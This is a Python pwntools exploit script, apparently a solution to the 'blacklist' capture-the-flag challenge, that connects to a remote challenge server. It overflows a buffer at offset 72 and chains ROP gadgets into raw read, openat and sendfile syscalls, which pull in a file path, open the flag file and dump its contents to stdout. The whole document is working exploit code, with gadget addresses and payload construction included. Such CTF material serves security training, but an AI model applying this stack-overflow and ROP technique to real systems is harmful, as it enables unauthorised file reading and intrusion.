from pwn import *

context(arch="amd64")
elf = ELF("./blacklist")

DEBUG = False
REMOTE = True

if DEBUG:
    p = gdb.debug("./blacklist", gdbscript="""
    b *0x4017b6
    continue
    """)
elif REMOTE:
    p = remote("blacklist.fword.wtf",1236)
else:
    p = process(elf.path)

offset = 72

read_n = 0
openat_n = 257 
sendfile_n = 40

pop_rdi_ret = 0x00000000004017b6#: pop rdi; ret;
pop_rsi_ret = 0x00000000004024f6#: pop rsi; ret;
pop_rdx_ret = 0x0000000000401db2#: pop rdx; ret;
pop_rax_ret = 0x0000000000401daf#: pop rax; ret;
pop_r10_ret = 0x0000000000401db1#: pop r10; ret;
syscall_ret = 0x000000000041860c#: syscall; ret;

string_addr = 0x004d1260
path_str = "/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt\x00"

# first payload to read string from stdin
payload = b""
payload += b"A"*offset 
payload += p64(pop_rdi_ret)
payload += p64(0) # arg1 fd
payload += p64(pop_rsi_ret)
payload += p64(string_addr) # arg2 buf
payload += p64(pop_rdx_ret)
payload += p64(300) # arg3 count
payload += p64(pop_rax_ret)
payload += p64(read_n)
payload += p64(syscall_ret) # read

# second payload to open the flag using openat
payload += p64(pop_rdi_ret)
payload += p64(0) # arg1 (doesn't matter)
payload += p64(pop_rsi_ret) 
payload += p64(string_addr) # arg2 path
payload += p64(pop_rdx_ret)
payload += p64(0) # arg3
payload += p64(pop_rax_ret)
payload += p64(openat_n)
payload += p64(syscall_ret) # openat

flag_fd = 3 # new fd of the flag will always be 3

# third payload to write flag to stdout using sendfile
payload += p64(pop_rdi_ret)
payload += p64(1) # arg1 dst fd: stdout
payload += p64(pop_rsi_ret)
payload += p64(flag_fd) # arg2 src fd: flag_fd
payload += p64(pop_rdx_ret)
payload += p64(0) # arg3 offset
payload += p64(pop_r10_ret)
payload += p64(0xffff) # arg4 count
payload += p64(pop_rax_ret)
payload += p64(sendfile_n)
payload += p64(syscall_ret) # sendfile

p.sendline(payload)
p.sendline(path_str)
p.interactive()
